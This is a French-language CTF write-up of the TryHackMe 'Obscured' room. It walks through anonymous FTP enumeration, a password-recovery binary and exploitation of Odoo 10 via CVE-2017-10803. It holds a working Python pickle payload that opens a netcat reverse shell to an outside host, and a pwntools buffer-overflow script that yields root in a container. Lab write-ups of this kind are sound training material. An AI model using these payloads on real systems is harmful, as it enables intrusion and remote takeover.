# OBSCURED -TRY HACK ME WRITEUP 

Difficulté : medium 
Description : A CTF room focused on web and binary exploitation.


## RECONNAISSANCE 
Adresse ip : 10.80.166.175

### Port ouvert
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

## FTP ENUM
ftp-anon: Anonymous FTP login allowed (FTP code 230)

```
ftp> ls
229 Entering Extended Passive Mode (|||63310|)
150 Here comes the directory listing.
drwxr-xr-x    2 65534    65534        4096 Jul 24  2022 pub
226 Directory send OK.
ftp> get pub
local: pub remote: pub
229 Entering Extended Passive Mode (|||8958|)
550 Failed to open file.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||55173|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             134 Jul 24  2022 notice.txt
-rwxr-xr-x    1 0        0            8856 Jul 22  2022 password
226 Directory send OK.

kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/obscured$ cat notice.txt
From antisoft.thm security,


A number of people have been forgetting their passwords so we've made a temporary password application.

```

On a également un fichier binaire password, avec un static analysis, on a :
```
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/obscured$ ./password 
Password Recovery
Please enter your employee id that is in your email
971234596
remember this next time 'SecurePassword123!'
kryptonite@kryptonite-X550CC:~/Bureau/hacking/labs/tryhackme/obscured$ 

```


## HTTP ENUM
Werkzeug httpd 0.9.6 (Python 2.7.9)
en téléchargant le dump.sql, on a l'email du cible admin@antisoft.thm

## EXPLOITATION

On voit que ce site odoo version 10.0.x est vulnérable à une commande injection via un plugin d'anonimization de base de données (CVE-2017-10803)

on va donc generer un fichier .pickle pour le danomisateur, mais le système a seulement python2.7 

```
import cPickle
import os
import base64
import pickletools

class Exploit(object):
  def __reduce__(self):
    return (os.system, (("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.130.110 4444 >/tmp/f"),))

with open("exploit.pickle", "wb") as f:
  cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)
```

On a maintenant notre reverse shell, mais on est sur un container.

On voit un binaire ret étrange, et en analysant, on sait maintemant qu'il est vulnérable à un buffer overflow

```
#!/usr/bin/python
from pwn import *

elf = ELF("./ret", checksec = False)
p = process("./ret")

offset = 128 + 8

payload = b"a"*offset + p64(elf.symbols.win + 1 )
print(payload)

p.recvuntil("for me?\n")
p.sendline(payload)
p.clean()
p.interactive()
```

et on obtient notre payload 

```
$ (python -c "print(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaG\x06@\x00\x00\x00\x00\x00')"; cat)|/ret
Exploit this binary to get on the box!
What do you have for me?
ls
addons
field_anonymization_main_1.pickle
filestore
flag.txt
sessions
id
uid=105(odoo) gid=109(odoo) euid=0(root) groups=109(odoo)
whoami
root
cat /root/root.txt
Well done,my friend, you rooted a docker container.

```


